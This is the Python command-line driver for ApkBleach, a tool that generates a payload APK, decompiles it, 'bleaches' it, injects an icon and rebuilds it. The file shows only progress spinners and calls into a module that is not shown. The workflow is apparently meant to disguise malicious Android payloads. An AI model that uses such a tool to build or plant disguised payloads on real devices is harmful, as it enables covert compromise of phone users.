#!/usr/bin/env python3

from .bleach import ApkBleach
from colorama import Fore, Style
import os
import os.path
from pyfiglet import figlet_format
import sys, itertools
import threading
from time import sleep


def spin(msg, d_msg):
	for cycle in itertools.cycle(['|', '/', '-', '\\']):
		if stop_spin:
			break
		sys.stdout.write(f'\r{Fore.GREEN}{msg}' + f'{Fore.YELLOW}[' + f'{Fore.GREEN}{cycle}' + f'{Fore.YELLOW}]')
		sys.stdout.flush()
		sleep(0.1)
	sys.stdout.write(f'\r{d_msg}')


def main():
	start = ApkBleach()

	# Ascii art
	banner = figlet_format('ApkBleach', font='crawford')
	print(Fore.BLUE)
	print('\n'.join(l.center(os.get_terminal_size().columns) for l in banner.splitlines()))
	print(f'\t\t\b\b{Fore.YELLOW}Version: {Fore.BLUE}2.0   {Fore.YELLOW}Author: {Fore.BLUE}graylagx2\n'.center(os.get_terminal_size().columns))

	start.check_dependencies()

	global stop_spin
	stop_spin = False
	gen_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Generating payload ", f"{Fore.YELLOW}Payload generated {Fore.GREEN}[*] "))
	gen_loading.start()
	generate = start.generate_payload()
	stop_spin = True
	gen_loading.join()
	print("\n")
	if generate[0] == 'Error':
		for repeat in range(2):
			print("\033[A                                       \033[A")
		os.remove("/tmp/apkbleach_error.log")
		sys.exit(f"\t{Fore.RED}{generate[1]}{Fore.RESET}\n".center(os.get_terminal_size().columns))

	stop_spin = False
	dec_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Decompiling Apk ", f"{Fore.YELLOW}Apk decompiled {Fore.GREEN}[*] "))
	dec_loading.start()
	start.decompile_apk() if os.path.isfile('/tmp/bleach_me.apk') else sys.exit("Can not find payload Apk")
	stop_spin = True
	dec_loading.join()
	print("\n")

	start.bleach_apk() 
	print(f"{Fore.YELLOW}Apk bleached {Fore.GREEN}[*] \n")

	try:
		if start.icon:
			stop_spin = False
			icon_inject_loading = threading.Thread(target=spin, args=(f"{Fore.YELLOW}Injecting icon ", f"{Fore.YELLOW}Icon injected{Fore.GREEN} [*]  "))
			icon_inject_loading.start()
			start.icon_inject()
			stop_spin = True
			icon_inject_loading.join()
			print("\n")
	except: 
		pass


	start.rebuild_apk()
	print(f"{Fore.YELLOW}Rebuilt apk {Fore.GREEN}[*] \n")

	if os.path.isfile(start.output_file):
		print(f"{Fore.YELLOW}ApkBleach complete {Fore.GREEN}[*]\n")
		print(f"\t\t\b\b{Fore.GREEN}\033[4mApk saved as: {start.output_file}{Fore.WHITE}\033[0m".center(os.get_terminal_size().columns))
		print('\n')

if __name__ == "__main__":
	main()

